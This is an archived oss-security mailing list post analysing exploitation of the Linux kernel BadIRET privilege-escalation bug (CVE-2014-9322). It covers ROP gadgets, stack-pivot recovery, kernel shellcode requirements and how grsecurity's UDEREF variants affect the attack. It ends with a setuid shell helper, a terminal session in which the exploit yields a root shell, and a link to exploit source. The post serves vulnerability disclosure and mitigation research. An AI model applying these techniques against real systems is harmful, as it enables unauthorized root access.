@@ -1,0 +1,381 @@
+
+Date: Sat, 4 Jul 2015 09:23:48 +0200
+From: Adam Zabrocki <pi3@....com.pl>
+To: oss-security@...ts.openwall.com
+Subject: Follow-up on Exploiting "BadIRET" vulnerability (CVE-2014-9322)
+
+Hi,
+
+The journey into CVE-2014-9322 is not straightforward but it is worth to spend some time on it and analyze all available information. I will try my best...
+
+
+1) Introduction - non-technical (almost)
+
+Everything starts from the CVE-2014-9090. This vulnerability was discovered by Andy Lutomirski which allows you (quoting MITRE):
+
+"The do_double_fault function in arch/x86/kernel/traps.c in the Linux kernel through 3.17.4 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to cause a denial of service (panic) (...)"
+
+which essentially may results in local DoS attack. It doesn't sounds so critical from the defender's point of view (but still it takes attention especially from the nature of vulnerability point of view) neither from the attackers perspective. Mainly because of the potential limited benefits after successful exploitation.
+
+The "fun" starts after Borislav Petkov asked some questions about CVE-2014-9090. Andy Lutomirski discovered another vulnerability in the same functionality which was masked by first one. (Un)fortunately this time it was very serious (I would say critical) flaw. Linux kernel does not properly handle faults associated with the Stack Segment (SS) register in the x86 architecture. Quoiting MITRE again:
+
+"(...) allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space."
+
+Does the nature of vulnerability sound familiar?
+What about Rafal 'n3rgal' Wojtczuk research which ends up receiving CVE-2012-0217? (which was directly connected with CVE-2006-0744).
+Yes... in principals both vulnerabilities gave us same thing - we can force kernel to be executed under user-controlled GS base address (via %gs register).
+
+For some reasons CVE-2014-9322 didn't take much attention (again similarities to CVE-2006-0744) until Rafal 'n3rgal' Wojtczuk didn't point it out on 2nd of February 2015 via publish amazing research on Bromium Labs blog:
+
+http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
+
+about how the nature of vulnerability works, how it can be used to achieve code-exec (which is not trivial - great research!) and using single NULL-byte write primitive turn into fully weaponized exploit which bypasses SMEP mitigation (not SMAP). Highly recommended to review it in details.
+
+After this publication vulnerability started to get more and more attention (especially from the grsecurity twitter account :)). Until now (almost half a year) there is not known public real exploit which will fully implement Rafal's idea to achieve code-execution. There is only Proof-Of-Concept available which results in DoS attack (so the same as results of CVE-2014-9090 - not very useful):
+
+https://rdot.org/forum/showthread.php?t=3341
+
+which ends up being here:
+
+https://www.exploit-db.com/exploits/36266/
+
+
+2) More technical part (based on Fedora 20 -> kernel: 3.11.10-301.fc20.x86_64)
+
+I decided to take a challenge and fully implement Rafal's idea and end-up being successed solving some interesting problems during the work. I will start where Rafal finished his write-up, which means we end up successfully stack pivoting and executing ROP gadgets (in his case disabling SMEP in CR4 register and executing 'real' shellcode/kernelcode in userland page).
+
+*) Stack pivoting and ROP are being executed in the context of follow_link() function which is inlined in path_openat(). The context flow can be summarized as follow:
+
+SyS_open -> SYSC_open -> do_sys_open -> do_filp_open -> path_openat -> follow_link()
+
+Inlined function do relative call which in the end redirect transfer to our code:
+
+...
+   0xffffffff811b84ab <+955>:   jmpq   0xffffffff811b81b3 <path_openat+195>
+   0xffffffff811b84b0 <+960>:   movl   $0x4,0x40(%r12)
+   0xffffffff811b84b9 <+969>:   mov    0x30(%r15),%rax
+   0xffffffff811b84bd <+973>:   mov    %r15,%rdi
+   0xffffffff811b84c0 <+976>:   mov    %r12,%rsi
+   0xffffffff811b84c3 <+979>:   mov    0x20(%rax),%rax
+   0xffffffff811b84c7 <+983>:   callq  *0x8(%rax)
+                                ^^^^^^^^^^^^^^^^^
+   0xffffffff811b84ca <+986>:   cmp    $0xfffffffffffff000,%rax
+   0xffffffff811b84d0 <+992>:   mov    %rax,%r15
+   0xffffffff811b84d3 <+995>:   jbe    0xffffffff811b8532 <path_openat+1090>
+   0xffffffff811b84d5 <+997>:   mov    %r12,%rdi
+   0xffffffff811b84d8 <+1000>:  mov    %eax,%ebx
+   0xffffffff811b84da <+1002>:  callq  0xffffffff811b2930 <path_put>
+...
+
+After our code has being executed first problems start (cleaning part). Every call to function path_put(), do_last(), dput(), mntput() or put_link(), may ends up playing with kernel locks. Because the stack is pivoted this will not going to be 
+happy ending. Additionally, path_openat() has inline many functionalities, some registers have special meaning (pointers to the structures/objects) which kernel will try to access at some point at may results in kernel crash and/or panic. At the beginning I was trying to track down all problematic execution and manually fixing it but there is just too many correlation between registers/objects/spinlocks... (btw. Linux kernel 3.xx changed internal representation of raw_spin_lock 
+comparing to previous kernels which is (un)fortunately much more problematic when you want manually synchronize it).
+There needed to be better solution, and if you think about pivoting itself you may find one. If you instead of manual fixing all necessary problems force kernel to do it you may win that game. If you find a way to "restore" original stack frame 
+for the function before stack pivoting was taken kernel should naturally remove all locks and correctly unwind the stack and system will be stable. This can be achieved via let's call it reverse stack pivoting :) Directly after stack pivot, in 
+temporary register you should have valid address of the stack which you want to know. In our case situation is a bit more complicate because we are losing 32 most significant bits of the address. ROP gadget looks like:
+
+   0xffffffff8119f1ed <__mem_cgroup_try_charge+1949>:   xchg   %eax,%esp
+   0xffffffff8119f1ee <__mem_cgroup_try_charge+1950>:   retq
+
+why this gadget was taken and we lose 32bits (we want to)? Please read Rafal's write-up.
+So if we find some ROP gadget which directly after stack pivoting will save 32 least significant bits of original stack pointer in safe place, we could try to restore it and reconstruct original address before we gave control to the kernel. I've 
+chosen following ROP-gadget:
+
+   0xffffffff8152d8fe <kernel_listen+14>:       push   %rax
+   0xffffffff8152d8ff <kernel_listen+15>:       pop    %rax
+   0xffffffff8152d900 <kernel_listen+16>:       pop    %rbp
+   0xffffffff8152d901 <kernel_listen+17>:       retq
+
+which essentially push %rax value (in fact high bits are zeroed) and move stack pointer after stored value. At this point we may precisely calculate where it will be stored.
+
+Problem solved (reverse-stack pivot won :P)
+
+*) If your shellcode is going to be executed for too long there is high chance scheduler will preempt you which sometimes may be critical - depends on the current stage of execution and what is going to be preempting you. Quite often you may 
+receive APIC timer interrupt connected with updating process times (known as tick'ing) which may screw you up on some corner cases - it should be taken into account!
+
+btw. if you have bad luck you may be preempted as soon as you did stack pivoting ;p
+
+*) Our code is executed while proc_root structure is corrupted... :) This is NOT what we would like to have. It dramatically increases chance of kernel crash if other process will do any operation on /proc pseudo-filesystem. proc_root.subdir value must be restored as soon as it can be to decrease the chance of random crash. There is few possible ways of doing it:
+
+a) instead of overwriting 6 bytes of subdir do only 5 of them which will leave 3 bytes untouched. This means we can easily reconstruct original value by adding 0xffff8800 value at the most significant bits (for that kernel) and trying to find 
+only 1 byte which is 256 possibilities. Chance of crash is very low (touching not mapped page). Additionally this requires allocation in user space around 16 MB to have guarantee that after referencing overwritten proc_root.subdir always ends up 
+in our controlled memory.
+
+b) we can brute force full address by 'preventing' from Page Fault (#PF). For the short period of time we can overwrite #PF handler with simple code:
+- Get the exception from the stack
+- Change the address which caused crash to smth which we know is mapped
+- Restart faulting instruction
+
+original brute force loop will continue running
+
+c) Ignore all of the problems and just reconstruct address as much as it can be and do brute force rest of the bytes. Apparently it's quite reliable and effective. We know that high significant bytes are 0xffff8800 and we have 2 least 
+significant bytes. We need to find 2 bytes which are unknown for us. On Linux (as opposed to Windows) kernel memory are not being paged out (swapped out). Chance of hitting unmapped page is quite low when we brute force just 2 bytes in the 
+middle of reconstructed address - believe me or not, it works well :)
+
+Problem is also how we judge if the address is correct or not. It's quite simple, struct proc_dir_etry has 'parent' field. We must find address which will have on the specific offset, address of proc_root (which is known). In the end we check 65536 addresses and chance of FP is low as well. I've never hit that situation.
+
+
+Summarizing our shellcode must:
+- save original stack pointer value
+- disable interrupts (to prevent from being preempted) and start to reconstruct corrupted proc_root.subdir value
+- do REAL (s)hellcode
+- restore original stack pointer
+- restore frame pointer
+- restore registers pointing to the internal objects
+- enable interrupts and return to the normal kernel execution
+
+
+3) Grsecurity => UDEREF
+
+As I mentioned Rafal's research has been "sighted" by spender via:
+
+http://twitter.com/grsecurity/status/562363332079144960
+http://twitter.com/grsecurity/status/562363788125831172
+
+Additionally some people suggests UDEREF is as effective as SMAP with blocking exploitation of this vulnerability:
+
+http://seclists.org/oss-sec/2014/q4/1052
+
+"This is likely to be easy to exploit for privilege escalation, except
+on systems with SMAP or UDEREF.  On those systems, assuming that the
+mitigation works correctly, the impact of this bug may be limited to
+massive memory corruption and an eventual crash or reboot."
+
+This is not completely true. UDEREF may be as effective (in fact even more) as SMAP or only as effective as SMEP (on AMD64) which will not prevent exploitation at all (using described technique). So what's going on? :) Currently UDEREF for AMD64 has 3 different implementations:
+
+- slow / weak legacy implementation
+- strong implementation on Sandy Bridge and later
+- fast / weak implementation on Sandy Bridge and later
+
+First implementation of UDEREF on AMD64 was "weak" implementation and information about it was described by PaX team here:
+
+http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html
+
+I will quote the essential part of it:
+
+"(...) so what does UDEREF do on amd64? on userland->kernel transitions it basically
+unmaps the original userland address range and remaps it at a different address
+using non-exec/supervisor rights (so direct code execution as used by most
+exploits is not possible at least). (...)"
+
+and next:
+
+"(...) UDEREF/amd64 doesn't ensure that the (legitimate) userland accessor
+functions cannot actually access kernel memory when only userland is allowed
+(some in-kernel users of certain syscalls can temporarily access kernel memory
+as userland, and that is enforced on UDEREF/i386 but not on amd64). so if
+there's a bug where userland can trick the kernel into accessing a userland
+pointer that actually points to kernel space, it'll succeed, unlike on i386.
+
+the other bad thing is the presence of the userland shadow area. this has
+two consequences: 1. the userland address space size is smaller under UDEREF
+(42 vs. 47 bits, with corresponding reduction of ASLR of course), 2. this
+shadow area is always mapped so kernel code accidentally accessing its range
+may not oops on it and can be exploited (such accesses can usually happen only
+if an exploit can make the kernel dereference arbitrary addresses in which
+case the presence of this area is the least of your concerns though).(...)"
+
+== weak UDEREF ==
+This means it works essentially similar to SMEP. So how to exploit CVE-2014-9322 under this specific implementation of UDEREF? You just need to change the ROP. Instead of disabling SMEP bit in CR4 register and execute code from the user land, 
+implement full shellcode as ROP. It is possible and it won't be stop by weak implementation of UDEREF.
+
+
+== "new" UDEREF ==
+Why strong implementation of UDEREF is different and why does it require Sandy Bridge architecture?
+Yes, that's the fun part. I haven't seen any official write-up regarding "new" UDEREF. I wasn't even aware about those changed since I was playing with that exploit :)
+
+Strong implementation of UDEREF using Sandy Bridge++ feature called as PCID to make 'tags' in TLB. By doing it UDEREF may completely separate user land from kernel (via creating new PGD tables):
+
+static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
+{
+++#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
++     if (!(static_cpu_has(X86_FEATURE_PCID))) {
++             unsigned int i;+                pgd_t *pgd;
+++            pax_open_kernel();
++             pgd = get_cpu_pgd(smp_processor_id(), kernel);
++             for (i = USER_PGD_PTRS; i < 2 * USER_PGD_PTRS; ++i)
++                     set_pgd_batched(pgd+i, native_make_pgd(0));
++             pax_close_kernel();
++     }
++#endif
+
++#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
++             if (static_cpu_has(X86_FEATURE_PCID)) {
++                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
++                             u64 descriptor[2];
++                             descriptor[0] = PCID_USER;
++                             asm volatile(__ASM_INVPCID : : "d"(&descriptor), "a"(INVPCID_SINGLE_CONTEXT) : "memory");
++                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
++                                     descriptor[0] = PCID_KERNEL;
++                                     asm volatile(__ASM_INVPCID : : "d"(&descriptor), "a"(INVPCID_SINGLE_CONTEXT) : "memory");
++                             }
++                     } else {
++                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
++                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
++                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
++                             else
++                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
++}
++             } else
++#endif
+
+
+
+In the end context run in kernel mode will NOT see any usermode pages. This implementation I personally believe is much stronger than SMAP. Why?
+
+1. You can't just disable one bit in CR4 register to fully turn off this mitigation
+2. In case of SMAP, you can see userland pages (there is existing Page Tables translating userland addresses. 'P' bit is set) but you just can't touch it. In "new" UDEREF you don't see userland at all (PGD is completely different for kernel context and there is no Page Tables describing userland addresses. 'P' bit is unset).
+
+This version of UDEREF was firstly introduced on grsecurity version 3.0 in February 2014. Good work! Will be nice if PaX/grsecurity may publish some details of their research and great implementation :)
+
+
+Btw. In both cases result of touching userland addresses is the same - #PF will be generated :)
+Btw2. The same "strong" UDEREF functionality may be achieved without hardware PCID feature. The main difference is performance. Without hardware support for PCID it should be a mess from the performance point of view.
+
+
+== Summarizing ==
+This vulnerability can be exploited under UDEREF and can NOT be exploited under "new" UDEREF which is enabled on Sandy Bridge++ architecture.
+
+In fact you can still use this vulnerability to fully DoS machine under "new" UDEREF? How? It's quite funny and tricky, you can force infinitive loop of #PF :) As soon as kernel enters to the do_general_protection() function it will try to read GDT bia GS base by executing following instruction:
+
+    0xffffffff8172910e <do_general_protection+30>:       mov    %gs:0xa880,%rbx
+
+at this situation GS base is pointing to the userland memory. Because there is no PTE entry for that address (kernel context doesn't see userland at all), #PF will be generated. page_fault() function will be executed and following:
+
+page_fault -> do_page_fault -> __do_page_fault -> restore_args
+
+it will try to read GDT again and next #PF will be generated and so on... so on... so on... :) So yes, you can still crash the kernel but there is no way to do anything else because there is no even room for exploitation. Vulnerability has being stopped at principals.
+
+
+4) Funny facts :)
+
+a) Some versions of libthread requires to create memory with RWX permission when you call pthread_create() function. This is not allowed under PaX/grsec hardening of mmap() and as soon as internal implementation pthread_create() will call 
+mmap(), process will be killed :) I met this situation on default installation of Ubuntu LTS where I was testing kernel with grsecurity hardening.
+
+b) on kernel 3.11.10-301.fc20.x86_64 implementation of __switch_to() function using OSXSAVE extension (bit 18 in CR4 register) without checking if CPU has this extension or not:
+
+     0xffffffff81011714 <__switch_to+644>    xsaveopt64 (%rdi)
+
+__switch_to() is executed under disabled interrupts but if OSXSAVE extension is not enabled CPU will generate #UD and it will be deadlock. Before entering to __switch_to() instruction regardless disabling interrupts also there is locked runqueue which will never be unlocked in case of #UD.
+I wonder if someone hit this problem in real life :)
+
+c) Fedora 20 exploitation is pretty stable (source code available on my website):
+
+[pi3@...alhost clean_9322]$ cat z_shell.c
+#include <stdio.h>
+
+int main(void) {
+
+   char *p_arg[] = { "/bin/sh", NULL };
+
+   setuid(0);
+   seteuid(0);
+   setgid(0);
+   setegid(0);
+   execv("/bin/sh",p_arg,NULL);
+
+}
+[pi3@...alhost clean_9322]$ gcc z_shell.c -o z_shell
+[pi3@...alhost clean_9322]$ cp z_shell /tmp/pi3
+[pi3@...alhost clean_9322]$ ls -al /tmp/pi3
+-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
+[pi3@...alhost clean_9322]$ id
+uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
+[pi3@...alhost clean_9322]$ /tmp/pi3
+sh-4.2$ id
+uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
+sh-4.2$ exit
+exit
+[pi3@...alhost clean_9322]$ gcc -o procrop procrop.c setss.S
+[pi3@...alhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
+swapgs.c: In function ‘main’:
+swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+               : "r"(4), "r"((int)p_to_d), "r"(1)
+                             ^
+[pi3@...alhost clean_9322]$ ./procrop
+
+        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
+                           by Rafal 'n3rgal' Wojtczuk
+                           && Adam 'pi3' Zabrocki
+
+                Usage: ./procrop <number>
+
+                        Number:
+
+                                1 - kernel [3.11.10-301.fc20.x86_64]
+
+[pi3@...alhost clean_9322]$ ./procrop 1 &
+[1] 5827
+[pi3@...alhost clean_9322]$
+        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
+                           by Rafal 'n3rgal' Wojtczuk
+                           && Adam 'pi3' Zabrocki
+
+        [+] Using kernel target: 3.11.10-301.fc20.x86_64
+
+[pi3@...alhost clean_9322]$
+[pi3@...alhost clean_9322]$
+[pi3@...alhost clean_9322]$ ps aux |grep procr
+pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
+pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
+[pi3@...alhost clean_9322]$ ./p_write8
+
+        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
+                           by Rafal 'n3rgal' Wojtczuk
+                           && Adam 'pi3' Zabrocki
+
+                Usage: ./p_write8 <number>
+
+                        Number:
+
+                                1 - kernel [3.11.10-301.fc20.x86_64]
+
+[pi3@...alhost clean_9322]$
+[pi3@...alhost clean_9322]$ ./p_write8 1
+
+        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
+                           by Rafal 'n3rgal' Wojtczuk
+                           && Adam 'pi3' Zabrocki
+
+        [+] Using kernel target: 3.11.10-301.fc20.x86_64
+        [+] mmap() memory in first 2GB of address space... DONE!
+        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
+        [+] Creating LDT for this process... DONE!
+        [+] Press enter to start fun-game...
+[exploit] pthread 
+runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  
+Done                    ./procrop 1
+Segmentation fault (core dumped)
+[pi3@...alhost clean_9322]$ ls -al /tmp/pi3
+-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
+[pi3@...alhost clean_9322]$ id
+uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
+[pi3@...alhost clean_9322]$ /tmp/pi3
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root),1000(pi3)
+sh-4.2# exit
+exit
+[pi3@...alhost clean_9322]$
+
+
+
+References:
+1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
+2) https://rdot.org/forum/showthread.php?t=3341
+3) https://www.exploit-db.com/exploits/36266/
+4) http://blog.pi3.com.pl/?p=509
+5) http://twitter.com/grsecurity/status/562363332079144960
+6) http://twitter.com/grsecurity/status/562363788125831172
+7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
+8) http://seclists.org/oss-sec/2014/q4/1052
+9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html
+
+
+
+Best regards,
+Adam 'pi3' Zabrocki
+
+
+-- 
+pi3 (pi3ki31ny) - pi3 (at) itsec pl
+http://pi3.com.pl
